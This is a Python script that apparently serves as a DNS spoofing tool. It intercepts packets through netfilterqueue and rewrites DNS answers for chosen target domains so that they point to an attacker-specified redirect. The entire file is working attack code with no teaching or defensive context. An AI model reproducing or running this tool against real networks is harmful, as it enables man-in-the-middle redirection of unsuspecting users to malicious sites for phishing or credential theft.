from scapy.all import IP, DNSRR, DNSQR, DNS, UDP
from netfilterqueue import NetfilterQueue, Packet
from typing import NamedTuple
from argparse import ArgumentParser, ArgumentError

class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    target_domains: tuple
    redirect_domain: str
    verbose: bool

def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options.
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-d', '--domains', dest='domains', help='Comma delimited list of target domains to spoof')
        parser.add_argument('-r', '--redirect', dest='redirect', help='Domain to redirect dns requests towards')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        options = parser.parse_args()
        if not options.verbose:
            options.verbose = False
        if not options.domains:
            raise ArgumentError(argument=options.domains, message='Invalid list of target domains specified.')
        if not options.redirect:
            raise ArgumentError(argument=options.redirect, message='Invalid redirect domain specified.')
        target_domains = tuple(options.domains.split(','))
        return Options(target_domains, options.redirect, options.verbose)
    except ArgumentError as e:
        if not options.verbose:
            error('An error occurred while parsing input arguments.')
        else:
            error(f'An error occurred while parsing input arguments: {str(e)}')
    return Options((), '', False)

def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting.
    '''
    print(f'[-] {msg} Exiting...')
    exit()

def proc_packet(packet: 'Packet') -> None:
    '''
    Consumes a given packet. If the qname field of the packet matches a target domain a forged 
    response is generated directed towards a desired domain.
    '''
    ip = IP(packet.get_payload())
    global config
    if ip.haslayer(DNSRR):
        qname = ip[DNSQR].qname.decode('utf-8')
        for domain in config.target_domains:
            if domain in qname: 
                print(f'[+] Spoofing {domain}')
                resp = DNSRR(rrname=qname, rdata=config.redirect_domain)
                ip[DNS].an = resp
                ip[DNS].ancount = 1
                del ip[IP].len
                del ip[IP].chksum
                del ip[UDP].chksum
                del ip[UDP].len
                packet.set_payload(bytes(ip))
    packet.accept()

def main(*args, **kwargs) -> None:
    try:
        global config
        config = get_args()
        queue = NetfilterQueue()
        queue.bind(0, proc_packet)
        print('[+] Waiting for DNS queries on target domains...')
        queue.run()
    except (KeyboardInterrupt, InterruptedError):
        print('\n[+] Detected interrupt. Exiting...')

if __name__ == "__main__": main()